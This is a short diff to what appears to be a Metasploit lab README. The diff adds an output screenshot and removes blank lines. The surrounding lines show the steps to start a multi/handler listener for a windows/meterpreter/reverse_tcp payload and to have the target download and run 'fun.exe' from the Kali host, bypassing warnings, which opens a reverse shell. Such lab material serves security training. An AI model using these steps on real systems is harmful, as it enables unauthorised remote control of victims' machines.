@@ -101,13 +101,10 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
-
-
+<img width="539" height="107" alt="image" src="https://github.com/user-attachments/assets/b4004be8-5d93-4140-b3d8-3d208811e2c5" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
-
-
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
